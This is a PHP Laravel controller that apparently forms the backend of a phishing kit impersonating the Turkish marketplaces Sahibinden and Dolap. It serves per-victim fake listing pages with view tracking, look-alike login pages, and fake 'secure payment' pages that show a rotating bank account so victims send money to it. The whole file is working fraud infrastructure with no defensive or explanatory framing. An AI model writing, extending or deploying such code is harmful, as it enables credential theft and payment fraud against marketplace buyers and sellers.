<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Validator;

use App\Models\Link;
use App\Models\BankAccount;
use App\Models\Payment;


class AdController extends Controller
{
    
    public function sahibinden(Request $request, $link_id) { 

        $validator = Validator::make([ "link_id" => $link_id ], [
            "link_id" => "required|uuid|exists:links,id"
        ]);

        if ($validator->fails()) {

            return view("sahibinden-ad-invalid");

        }

        $link = Link::where("id", $link_id)->first();

        $link->views++;
        $link->save();

        $user_agent = $request->header("User-Agent");

        if (str_contains($user_agent, "Mobile")) {

            return view("sahibinden-ad-mobile", [
                "id" => $link->id,
                "product_info" => json_decode($link->product_info, true)
            ]);

        }

        return view("sahibinden-ad-desktop", [
            "id" => $link->id,
            "product_info" => json_decode($link->product_info, true)
        ]);

    }

    public function sahibinden_login_mobile(Request $request, $link_id) { 

        return view("sahibinden-login-mobile", [
            "id" => $link_id
        ]);

    }

    public function paramguvende(Request $request, $link_id) {

        $validator = Validator::make([ "link_id" => $link_id ], [
            "link_id" => "required|uuid|exists:links,id"
        ]);

        if ($validator->fails()) {

            return view("sahibinden-ad-invalid");

        }

        $link = Link::where("id", $link_id)->first();

        $bank_account = BankAccount::latest()->first();

        return view("sahibinden-paramguvende", [
            "id" => $link->id,
            "paid" => Payment::where("link_id", $link_id)->exists(),
            "product_info" => json_decode($link->product_info, true),
            "bank" => $bank_account->bank,
            "bank_account_number" => $bank_account->account_number,
            "bank_account_holder" => $bank_account->holder
        ]);

    }

    public function dolap(Request $request, $link_id) { 

        $validator = Validator::make([ "link_id" => $link_id ], [
            "link_id" => "required|uuid|exists:links,id"
        ]);

        if ($validator->fails()) {

            return view("dolap-ad-invalid");

        }

        $link = Link::where("id", $link_id)->first();

        $link->views++;
        $link->save();

        return view("dolap-ad", [
            "id" => $link->id,
            "product_info" => json_decode($link->product_info, true)
        ]);

    }

    public function dolap_login(Request $request, $link_id) { 

        return view("dolap-login", [
            "id" => $link_id
        ]);

    }

    public function dolap_guvenliodeme(Request $request, $link_id) {

        $validator = Validator::make([ "link_id" => $link_id ], [
            "link_id" => "required|uuid|exists:links,id"
        ]);

        if ($validator->fails()) {

            return view("dolap-ad-invalid");

        }

        $link = Link::where("id", $link_id)->first();

        $bank_account = BankAccount::latest()->first();

        return view("dolap-guvenliodeme", [
            "id" => $link->id,
            "paid" => Payment::where("link_id", $link_id)->exists(),
            "product_info" => json_decode($link->product_info, true),
            "bank" => $bank_account->bank,
            "bank_account_number" => $bank_account->account_number,
            "bank_account_holder" => $bank_account->holder
        ]);

    }

};